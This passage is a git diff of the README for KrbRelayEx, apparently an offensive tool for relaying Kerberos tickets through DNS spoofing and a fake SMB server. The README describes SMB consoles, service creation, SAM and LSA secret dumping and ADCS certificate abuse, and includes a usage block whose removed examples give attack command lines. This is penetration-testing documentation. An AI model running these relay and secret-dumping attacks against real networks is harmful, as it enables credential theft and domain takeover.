@@ -1,110 +1,88 @@
-# KrbRelayEx
-
+# KrbRelayEx  
 ![Version](https://img.shields.io/badge/version-1.0-blue)  
 Kerberos Relay and Forwarder for (Fake) SMB MiTM Server  
 
 ---
+KrbRelayEx is a tool designed for performing Man-in-the-Middle (MitM) attacks by relaying Kerberos AP-REQ tickets. It listens for incoming SMB connections and forwards the AP-REQ to the target host, enabling access to SMB shares or HTTP ADCS (Active Directory Certificate Services) endpoints on behalf of the targeted identity.
 
-## Why this tool
-I have created this tool to explore the potential misuse of privileges granted to the **DnsAdmins** group in Active Directory, focusing on their ability to modify DNS records. <br>
-Members of this group are considered privileged users because they can make changes that impact how computers and services are located within a network. <br>
-However, despite this level of access, there has been relatively little documentation (apart from CVE-2021-40469) explaining how these privileges might be exploited in practice.
-<br>
-It's worth noting that manipulating DNS entries is not exclusive to DnsAdmins. Scenarios like DNS zones with **Insecure Updates** enabled (a surprisingly common misconfiguration!) or controlling HOSTS file entries on client machines can also enable such attacks.<br>
+## Why This Tool?  
 
-The goal of this tool was to test whether a Man-in-the-Middle (MitM) attack could be executed by exploiting DNS spoofing, traffic forwarding, and **Kerberos** relaying. This is especially relevant because **Kerberos** authentication is commonly used when a resource is accessed via its hostname or fully qualified domain name (FQDN), making it central to many corporate networks.
+I created this tool to explore the potential misuse of privileges granted to the `DnsAdmins` group in Active Directory, focusing on their ability to modify DNS records. Members of this group are considered privileged users because they can make changes that impact how computers and services are located within a network. However, despite this level of access, there has been relatively little documentation (apart from CVE-2021-40469) explaining how these privileges might be exploited in practice.
 
-Building upon this concept, I developed this tool, starting from [KrbRelay](https://github.com/cube0x0/KrbRelay), and implemented it in .NET 8.0 to ensure compatibility across both Windows and GNU/Linux platforms
-
+### Beyond DnsAdmins  
+Manipulating DNS entries isn’t exclusive to the `DnsAdmins` group. Other scenarios can also enable such attacks, such as:  
+- DNS zones with insecure updates enabled 
+- Controlling HOSTS file entries on client machines
 
 
-## Overview
+### Tool Goals  
+The goal of this tool was to test whether a Man-in-the-Middle (MitM) attack could be executed by exploiting DNS spoofing, traffic forwarding, and Kerberos relaying. This is particularly relevant because **Kerberos authentication** is commonly used when a resource is accessed via its hostname or fully qualified domain name (FQDN), making it a cornerstone of many corporate networks.
 
-**KrbRelayEx** is a tool designed for performing Man-in-the-Middle (MitM) attacks by relaying Kerberos AP-REQ tickets. It listens for incoming SMB connections and forwards the AP-REQ to the target host, enabling access to SMB shares or HTTP AD CS (Active Directory Certificate Services) endpoints on behalf the targeted identity.  
-
-The tool can span several SMB consoles, and the relaying process is completely transparent to the end user, who will seamlessly access the desired share.  
-
-GitHub Repository: [https://github.com/decoder-it/KrbRelayEx](https://github.com/decoder-it/KrbRelayEx)  
-
+Building upon the concept, I started from [KrbRelay](https://github.com/cube0x0/KrbRelay) and developed this tool in .NET 8.0 to ensure compatibility across both Windows and GNU/Linux platforms.
 
 ---
 
-## Features
+## Features  
 
-- Relay Kerberos AP-REQ tickets to access SMB shares or HTTP ADCS endpoints.
-- Interactive or background multithreaded SMB consoles for managing multiple connections, enabling file manipulation and creating/starting services
-- Multithreaded port forwarding to support other protocols.
-- Transparent relaying process for **seamless user access**.
-- Runs on Winodws and GNU/Linux with .NET 8.0 sdk
+- Relay Kerberos AP-REQ tickets to access SMB shares or HTTP ADCS endpoints.  
+- Interactive or background **multithreaded SMB consoles** for managing multiple connections, enabling file manipulation and the creation/startup of services.  
+- **Multithreaded port forwarding** to forward additional trafficfrom clients to original destination such as RDP, HTTP(S), RPC Mapper, WinRM,...
+- Transparent relaying process for **seamless user access**.  
+- Cross-platform compatibility with Windows and GNU/Linux via .NET 8.0 SDK.  
 
-## Notes
+---
 
-  - KrbRelayEx intercepts and relays the first authentication attempt,
-    then switches to forwarder mode for all subsequent incoming requests.
-    You can press any time 'r' for restarting relay mode
+## Notes  
 
-  - This tool is particularly effective if you can manipulate DNS names. Examples include:
-    - Being a member of the DNS Admins group.
-    - Having zones where unsecured DNS updates are allowed in Active Directory domains ==> This means that anonymous users with network access could potentially take over the domain!!!
-    - Gaining control over HOSTS file entries on client computers.
-  - Background consoles are ideal for managing multiple SMB consoles
-    
-  - A similar tool based on python and impacket libs can be found here https://github.com/almandin/krbjack
-  
-## Usage
+- **Relay and Forwarding Modes**:  
+  KrbRelayEx intercepts and relays the first authentication attempt, then switches to forwarder mode for all subsequent incoming requests. You can press `r` anytime to restart relay mode.  
 
-```
-        #############      KrbRelayEx by @decoder_it     ##############
-        # Kerberos Relay and Forwarder for (Fake) SMB MiTM Server     #
-        # v1.0 2024                                                   #
-        # Github: https://github.com/decoder-it/KrbRelayEx            #
-        ###############################################################
+- **Scenarios for Exploitation**:  
+  - Being a member of the `DnsAdmins` group.  
+  - Configuring DNS zones with **Insecure Updates**: This misconfiguration allows anonymous users with network access to perform DNS Updates and potentially take over the domain!  
+  - **Abusing HOSTS files for hostname spoofing**: By modifying HOSTS file entries on client machines, attackers can redirect hostname or FQDN-based traffic to an arbitrary IP address.  
 
-Description:
-  KrbRelayEx is a tool designed for performing Man-in-the-Middle (MitM) attacks and relaying Kerberos AP-REQ tickets.
-  It listens for incoming SMB connections and forward the AP-REQ to the target host, enabling access to SMB shares or HTTP ADCS (Active Directory Certificate Services endpoints)
-  The tool can span several SMB consoles, and the relaying process is *completely transparent* to the end user, who will seamlessly access the desired share.
+
+- **Background Consoles**:  
+  These are ideal for managing multiple SMB consoles simultaneously.  
+
+### Related Tools  
+For a similar Python-based tool built on Impacket libraries, check out [krbjack](https://github.com/almandin/krbjack).  
+
+---
+
+## Usage  
+
+```plaintext
+#############      KrbRelayEx by @decoder_it     ##############
+# Kerberos Relay and Forwarder for (Fake) SMB MiTM Server     #
+# v1.0 2024                                                   #
+# Github: https://github.com/decoder-it/KrbRelayEx            #
+###############################################################
 
 Usage:
   KrbRelayEx.exe -spn <SPN> [OPTIONS] [ATTACK]
 
 SMB Attacks:
   -console                       Start an interactive SMB console
-  -bgconsole                     Start an interactive SMB console in background via sockets
+  -bgconsole                     Start an interactive SMB console in the background via sockets
   -list                          List available SMB shares on the target system
   -bgconsolestartport            Specify the starting port for background SMB console sockets (default: 10000)
   -secrets                       Dump SAM & LSA secrets from the target system
 
 HTTP Attacks:
-  -endpoint <ENDPOINT>           Specify the HTTP endpoint to target (e.g., 'CertSrv')
+  -endpoint <ENDPOINT>           Specify the HTTP endpoint to target (e.g., `CertSrv`)
   -adcs <TEMPLATE>               Generate a certificate using the specified template
 
 Options:
   -redirectserver <IP>           Specify the IP address of the target server for the attack
   -ssl                           Use SSL transport for secure communication
   -spn <SPN>                     Set the Service Principal Name (SPN) for the target service
-  -redirectports <PORTS>         Provide a comma-separated list of additional ports to forward to the target (e.g., '3389,135,5985')
+  -redirectports <PORTS>         Comma-separated list of additional ports to forward (e.g., `3389,135,5985`)
   -smbport <PORT>                Specify the SMB port to listen on (default: 445)
-
-Examples:
-  Start an interactive SMB console:
-    KrbRelay.exe -spn CIFS/target.domain.com -console -redirecthost <ip_target_host>
-
-  List SMB shares on a target:
-    KrbRelay.exe -spn SMB/target.domain.com -list
-
-  Dump SAM & LSA secrets:
-    KrbRelay.exe -spn CIFS/target.domain.com -secrets -redirecthost <ip_target_host>
-
-  Start a background SMB console on port 10000 upon relay:
-    KrbRelay.exe -spn CIFS/target.domain.com -bgconsole -redirecthost <ip_target_host>
-
-  Generate a certificate using ADCS with a specific template:
-    KrbRelay.exe -spn HTTP/target.domain.com -endpoint CertSrv -adcs UserTemplate-redirecthost <ip_target_host>
-
-  Relay attacks with SSL and port forwarding:
-    KrbRelay.exe -spn HTTP/target.domain.com -ssl -redirectserver  <ip_target_host> -redirectports 3389,5985,135,443,80
 ```
+
+
 # Examples
 SMB Relay:
 ==========
